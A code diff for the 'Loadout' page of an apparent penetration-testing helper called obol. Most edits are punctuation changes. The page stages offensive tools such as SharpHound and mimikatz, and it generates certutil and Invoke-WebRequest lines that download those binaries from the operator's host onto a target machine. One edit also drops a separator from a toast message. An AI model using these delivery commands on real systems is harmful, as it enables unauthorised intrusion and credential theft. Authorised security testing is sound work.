@@ -94,7 +94,7 @@
 
   function toolCard(e, prof) {
     var recipe = e.manual
-      ? '<div class="lo-recipe lo-fetch">No published release — grab it from <a href="' + U.attr(e.manual_url || '#') + '" target="_blank" rel="noopener">' + esc(e.source || 'upstream') + ' ↗</a> and drop it in <code>~/.obol/arsenal/win</code>.</div>'
+      ? '<div class="lo-recipe lo-fetch">No published release, grab it from <a href="' + U.attr(e.manual_url || '#') + '" target="_blank" rel="noopener">' + esc(e.source || 'upstream') + ' ↗</a> and drop it in <code>~/.obol/arsenal/win</code>.</div>'
       : e.install
       ? '<div class="lo-recipe"><code>' + esc(e.install) + '</code><button class="btn-copy" data-copy="' + U.attr(e.install) + '">Copy</button></div>'
       : needsFetch(e) ? '<div class="lo-recipe lo-fetch">Fetched &amp; staged by the setup script.</div>' : '';
@@ -188,15 +188,15 @@
       return (a.label || a.key) < (b.label || b.key) ? -1 : 1;
     }).map(function (e) {
       var extra = '';
-      if (mode === 'manual' && e.manual_url) extra = ' — <a href="' + U.attr(e.manual_url) + '" target="_blank" rel="noopener">get it ↗</a>';
-      else if (mode === 'install' && e.install) extra = ' — <code>' + esc(e.install) + '</code>';
+      if (mode === 'manual' && e.manual_url) extra = '<a href="' + U.attr(e.manual_url) + '" target="_blank" rel="noopener">get it ↗</a>';
+      else if (mode === 'install' && e.install) extra = '<code>' + esc(e.install) + '</code>';
       else if (mode === 'failed') {
         var h = ((prof && prof.missing) || {})[e.key] || e.manual_url || (e.gh_repo ? 'https://github.com/' + e.gh_repo : '') || e.install || '';
-        if (/^https?:\/\//.test(h)) extra = ' — <a href="' + U.attr(h) + '" target="_blank" rel="noopener">find it ↗</a>';
-        else if (h) extra = ' — <code>' + esc(h) + '</code>';
+        if (/^https?:\/\//.test(h)) extra = '<a href="' + U.attr(h) + '" target="_blank" rel="noopener">find it ↗</a>';
+        else if (h) extra = '<code>' + esc(h) + '</code>';
       }
-      else if (mode === 'alt') { var t = (prof.tools || {})[e.key] || {}; extra = ' — present as <code>' + esc(t.invocation || '') + '</code>'; }
-      return '<li>' + esc(e.label || e.key) + extra + '</li>';
+      else if (mode === 'alt') { var t = (prof.tools || {})[e.key] || {}; extra = 'present as <code>' + esc(t.invocation || '') + '</code>'; }
+      return '<li>' + esc(e.label || e.key) + (extra ? ': ' + extra : '') + '</li>';
     }).join('') + '</ul>';
   }
 
@@ -212,16 +212,16 @@
           'The setup script tried to install these and couldn\'t (no package, a 404, a failed build). Grab each from its source, drop it on your PATH (or in <code>~/.obol/arsenal</code>), and re-paste.',
           reconList(r.installFailed, 'failed', prof))
       + pill(r.fetchMissing, 'lo-rp-warn', 'to install',
-          'obol\'s setup script fetches these — they\'re not on your box yet. Re-run Step 2 (<code>./download-arsenal.sh</code>) and paste back.',
+          'obol\'s setup script fetches these, they\'re not on your box yet. Re-run Step 2 (<code>./download-arsenal.sh</code>) and paste back.',
           reconList(r.fetchMissing, 'install', prof))
       + pill(r.manualMissing, 'lo-rp-warn', 'manual',
-          'No published release to auto-fetch — grab these by hand, then drop them in <code>~/.obol/arsenal/win</code>.',
+          'No published release to auto-fetch, grab these by hand, then drop them in <code>~/.obol/arsenal/win</code>.',
           reconList(r.manualMissing, 'manual', prof))
       + pill(r.kaliMissing, 'lo-rp-bad', 'expected on Kali, missing',
-          'obol assumed a Kali default install ships these, but yours didn\'t — likely a larger-metapackage tool (<code>apt install &lt;name&gt;</code>) or a flag to fix. Flag it to me if a core one shows here.',
+          'obol assumed a Kali default install ships these, but yours didn\'t, likely a larger-metapackage tool (<code>apt install &lt;name&gt;</code>) or a flag to fix. Flag it to me if a core one shows here.',
           reconList(r.kaliMissing, 'plain', prof))
       + pill(r.alt, 'lo-rp-info', 'aliased',
-          'Present under a different name than the canonical one — obol\'s command-rewrite already adapts to these.',
+          'Present under a different name than the canonical one, obol\'s command-rewrite already adapts to these.',
           reconList(r.alt, 'alt', prof));
     return '<div class="lo-recon">' + band + '</div>';
   }
@@ -247,7 +247,7 @@
     // secondary files that ship INSIDE a tool's archive (no registry entry of their own) — give them a card too.
     var EXTRA = {
       'SharpHound.ps1': { label: 'SharpHound.ps1', category: 'AD', canonical: 'SharpHound.ps1',
-        desc: 'The PowerShell build of the SharpHound collector — same BloodHound data collection as the .exe, for when you can run PowerShell but not drop a binary.',
+        desc: 'The PowerShell build of the SharpHound collector, same BloodHound data collection as the .exe, for when you can run PowerShell but not drop a binary.',
         example: '. .\\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All' },
       'mimilove.exe': { label: 'mimilove.exe', category: 'Credentials', canonical: 'mimilove.exe',
         desc: 'A mimikatz companion for very old Windows (2000/XP) where mimikatz itself won\'t run. Ships alongside mimikatz; rarely needed on modern boxes.',
@@ -273,8 +273,8 @@
         var dlCert = 'certutil -urlcache -f http://' + lhost + '/' + fn + ' ' + fn;
         var dlPs = 'iwr http://' + lhost + '/' + fn + ' -o ' + fn;
         deliver = '<span class="lo-ti-eg"><span class="lo-ti-eg-l">Deliver to target</span>'
-          + '<code class="btn-copy lo-ti-dl" data-copy="' + U.attr(dlCert) + '" title="certutil — built into every Windows, but AV/EDR-noisy. Click to copy.">' + esc(dlCert) + '</code>'
-          + '<code class="btn-copy lo-ti-dl" data-copy="' + U.attr(dlPs) + '" title="PowerShell Invoke-WebRequest — cleaner, needs PowerShell. Click to copy.">' + esc(dlPs) + '</code></span>';
+          + '<code class="btn-copy lo-ti-dl" data-copy="' + U.attr(dlCert) + '" title="certutil, built into every Windows, but AV/EDR-noisy. Click to copy.">' + esc(dlCert) + '</code>'
+          + '<code class="btn-copy lo-ti-dl" data-copy="' + U.attr(dlPs) + '" title="PowerShell Invoke-WebRequest, cleaner, needs PowerShell. Click to copy.">' + esc(dlPs) + '</code></span>';
       }
       return '<span class="lo-ti-card" role="tooltip">'
         + '<span class="lo-ti-card-h"><span class="lo-ti-name">' + esc(e.label || e.key) + '</span>'
@@ -375,7 +375,7 @@
         });
         if (!tot) return '';
         var cls = rdy >= tot ? 'lo-kc-full' : (rdy > 0 ? 'lo-kc-part' : 'lo-kc-none');
-        return '<button class="lo-kc ' + cls + '" type="button" data-phase="' + i + '" title="' + U.attr(ph.name + ': ' + rdy + ' of ' + tot + ' tools on your box — click to see them') + '">'
+        return '<button class="lo-kc ' + cls + '" type="button" data-phase="' + i + '" title="' + U.attr(ph.name + ': ' + rdy + ' of ' + tot + ' tools on your box, click to see them') + '">'
           + '<span class="lo-kc-n">' + esc(ph.name) + '</span><span class="lo-kc-v">' + rdy + '/' + tot + '</span></button>';
       }).join('');
       return '<div class="lo-kc-head"><span class="lo-kc-title">Kill-chain coverage</span>'
@@ -388,34 +388,34 @@
       + '<button class="lo-lens2-opt' + (_boxLens === 'cap' ? ' on' : '') + '" data-lens="cap" type="button">What it\'s for</button></div>';
     var body = _boxLens === 'cap' ? capRows() : fsRows;
     var cap = _boxLens === 'cap'
-      ? 'Your kit by capability — solid = on your box, <span class="lo-dim">dimmed = not yet</span>. Hover a tool to see what it does.'
-      : 'Where the script put things — expand a path, then hover a tool to see what it does.';
+      ? 'Your kit by capability, solid = on your box, <span class="lo-dim">dimmed = not yet</span>. Hover a tool to see what it does.'
+      : 'Where the script put things, expand a path, then hover a tool to see what it does.';
     return '<div class="lo-block"><div class="lo-sec-head"><h2 class="lo-h2">Your Box</h2>' + lensToggle
       + '<span class="lo-synced-chip"><span class="lo-synced-dot"></span> synced ' + esc(timeAgo(prof.savedAt)) + '</span></div>'
       + reconBand(prof)
       + readinessBar()
       + '<p class="lo-fs-cap">' + cap + '</p>'
-      + '<div class="lo-fs">' + (body || '<div class="lo-fs-empty">Nothing staged yet — run the setup script.</div>') + '</div></div>';
+      + '<div class="lo-fs">' + (body || '<div class="lo-fs-empty">Nothing staged yet, run the setup script.</div>') + '</div></div>';
   }
 
   function quickstart(prof) {
     var synced = !!prof;
     var steps = '<ol class="lo-steps">'
       + '<li><span class="lo-step-n">1</span><div><div class="lo-step-t">Download The Setup Script</div>'
-      + '<div class="lo-step-sub">One file. Fetches every tool obol uses that Kali doesn\'t ship and stages the Windows binaries — a fresh box to ready in one run.</div>'
+      + '<div class="lo-step-sub">One file. Fetches every tool obol uses that Kali doesn\'t ship and stages the Windows binaries, a fresh box to ready in one run.</div>'
       + '<label class="lo-optin"><input type="checkbox" class="lo-stamp-opt"' + (stampOn() ? ' checked' : '') + '> Also format my terminal prompt <span class="lo-optin-rec">recommended</span></label>'
-      + '<div class="lo-optin-why">Prepends a dim <code>[UTC time · tun0 IP]</code> line before each prompt — <strong>your prompt itself is untouched</strong>. obol reads it to stitch a pasted whole-session into a correct timeline and auto-fill your VPN IP (<code>{{lhost}}</code>). It\'s additive and reversible (one block in <code>~/.zshrc</code>); untick to skip — everything else works the same.</div>'
+      + '<div class="lo-optin-why">Prepends a dim <code>[UTC time · tun0 IP]</code> line before each prompt, <strong>your prompt itself is untouched</strong>. obol reads it to stitch a pasted whole-session into a correct timeline and auto-fill your VPN IP (<code>{{lhost}}</code>). It\'s additive and reversible (one block in <code>~/.zshrc</code>); untick to skip, everything else works the same.</div>'
       + '<button class="btn-primary lo-download">Download download-arsenal.sh</button></div></li>'
       + '<li><span class="lo-step-n">2</span><div><div class="lo-step-t">Run It On Your Kali Box</div>'
-      + '<div class="lo-step-sub">Run it as your normal user (not <code>sudo</code>). This assumes it landed in <code>~/Downloads</code> — adjust the path if you saved it elsewhere. Safe to re-run; it only does the missing work.</div>'
+      + '<div class="lo-step-sub">Run it as your normal user (not <code>sudo</code>). This assumes it landed in <code>~/Downloads</code>, adjust the path if you saved it elsewhere. Safe to re-run; it only does the missing work.</div>'
       + '<div class="lo-recipe"><code>cd ~/Downloads &amp;&amp; chmod +x download-arsenal.sh &amp;&amp; ./download-arsenal.sh</code><button class="btn-copy" data-copy="cd ~/Downloads &amp;&amp; chmod +x download-arsenal.sh &amp;&amp; ./download-arsenal.sh">Copy</button></div></div></li>'
       + '<li><span class="lo-step-n">3</span><div><div class="lo-step-t">Paste The Result Back</div>'
-      + '<div class="lo-step-sub">The script ends by printing a block fenced between two <code>✂</code> lines — select everything between them (including the <code>✂</code> lines is fine) and paste it here. obol learns your box.</div>'
+      + '<div class="lo-step-sub">The script ends by printing a block fenced between two <code>✂</code> lines, select everything between them (including the <code>✂</code> lines is fine) and paste it here. obol learns your box.</div>'
       + '<textarea class="lo-paste" placeholder="Paste the OBOL-ARSENAL block (or the whole script output) here…" spellcheck="false"></textarea>'
       + '<div class="lo-paste-row"><button class="btn-primary lo-ingest">Stock My Loadout</button><span class="lo-paste-msg" role="status"></span></div></div></li>'
       + '</ol>';
     if (!synced) {
-      return '<div class="lo-block"><h2 class="lo-h2">Set Up — One Time, ~2 Minutes</h2>' + steps + '</div>';
+      return '<div class="lo-block"><h2 class="lo-h2">Set Up, One Time, ~2 Minutes</h2>' + steps + '</div>';
     }
     return '<details class="lo-block lo-setup-done"><summary class="lo-h2 lo-setup-sum">Set Up Again / On Another Box</summary>' + steps + '</details>';
   }
@@ -450,12 +450,12 @@
       + '<h1 class="coach-h1">Loadout</h1>'
       + '<p class="coach-sub">' + (prof
           ? 'obol knows your box and tailors every command to the tools you actually have.'
-          : 'Set up your Kali box once — obol generates the script, you run it, paste the result back. Optional: skip it and every command still works.')
+          : 'Set up your Kali box once, obol generates the script, you run it, paste the result back. Optional: skip it and every command still works.')
       + '</p></div>'
       + '<div class="coach-metrics"><div class="metric"><span class="metric-n">' + total + '</span><span class="metric-l">Tools Obol Uses</span></div>'
       + (prof ? '<div class="metric"><span class="metric-n">' + countSummary(prof) + '</span><span class="metric-l">Ready On Your Box</span></div>' : '')
       + '</div></div>';
-    if (!prof) html += '<p class="lo-skip">New here? Do this first — or <a href="#/home">skip to Engagements →</a>. Nothing here blocks you.</p>';
+    if (!prof) html += '<p class="lo-skip">New here? Do this first, or <a href="#/home">skip to Engagements →</a>. Nothing here blocks you.</p>';
     html += quickstart(prof);
     if (prof) html += hostMap(prof);
     html += arsenalSection(prof);
@@ -463,7 +463,7 @@
   }
 
   function doDownload(mount) {
-    if (!OBOL.arsenal || !OBOL.arsenal.buildScript) { U.toast('Arsenal module still loading — try again', 'err'); return; }
+    if (!OBOL.arsenal || !OBOL.arsenal.buildScript) { U.toast('Arsenal module still loading, try again', 'err'); return; }
     var cb = mount && mount.querySelector('.lo-stamp-opt');
     var promptStamp = cb ? !!cb.checked : stampOn();
     var blob = new Blob([OBOL.arsenal.buildScript({ promptStamp: promptStamp })], { type: 'text/x-shellscript' });
@@ -495,7 +495,7 @@
       if (!text.trim()) { if (msg) msg.textContent = 'Paste the script output first.'; return; }
       var r = OBOL.arsenal.ingestInventory(text);
       if (!r.ok) { if (msg) { msg.textContent = r.reason; msg.className = 'lo-paste-msg err'; } return; }
-      U.toast('Loadout stocked — ' + r.present + ' tools, ' + r.staged + ' staged');
+      U.toast('Loadout stocked' + r.present + ' tools, ' + r.staged + ' staged');
       OBOL.router.render();
     });
   }
